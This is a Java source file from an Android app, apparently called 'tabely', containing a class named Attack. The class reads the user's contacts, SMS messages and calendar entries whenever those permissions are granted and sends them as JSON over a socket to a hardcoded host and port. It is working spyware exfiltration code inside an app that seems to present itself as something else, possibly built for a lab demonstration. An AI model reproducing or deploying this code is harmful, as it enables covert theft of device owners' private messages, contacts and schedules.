package com.snakesonwheels.tabely.controller;

import android.Manifest;
import android.os.Looper;

import com.snakesonwheels.tabely.view.HomeActivity;

import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.Socket;
import java.util.UUID;

public class Attack extends Thread {
    private final int port = 6789;
    private final String host = "192.168.74.2";
    private final UUID uuid = UUID.randomUUID();

    private HomeActivity homeActivity;

    public Attack(HomeActivity homeActivity) {
        this.homeActivity = homeActivity;
    }


    public void performAttack() {
        String data;
        String header;

        String testData = "Client: " + uuid + " wants to be attacked!";
        sendData(testData);


        //Contacts
        if (homeActivity.checkPermission(Manifest.permission.READ_CONTACTS)) {
            header = "{\"uuid\": \"" + uuid + "\"," +
                    "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
            data = homeActivity.gatherContactInformation();
            sendData(header + data + "}");
        } else {
            sendData("Client: " + uuid + " has not granted contacts permission");
        }

        //SMS
        if (homeActivity.checkPermission(Manifest.permission.READ_SMS)) {
            header = "{\"uuid\": \"" + uuid + "\"," +
                    "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
            data = homeActivity.gatherSMSInformation();
            sendData(header + data + "}");
        } else {
            sendData("Client: " + uuid + " has not granted SMS permission");
        }

        //Calendar
        if (homeActivity.checkPermission(Manifest.permission.READ_CALENDAR)) {
            header = "{\"uuid\": \"" + uuid + "\"," +
                    "\"timestamp\": \"" + System.currentTimeMillis() + "\",";
            data = homeActivity.gatherCalenderInformation();
            sendData(header + data + "}");
        } else {
            sendData("Client: " + uuid + " has not granted calendar permission");
        }

    }

    private void sendData(String data) {
        try {
            Socket socket = new Socket(host, port);

            OutputStream outputStream = socket.getOutputStream();
            PrintStream printStream = new PrintStream(outputStream, true);
            printStream.println(data);

            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public void run() {
        performAttack();
    }
}
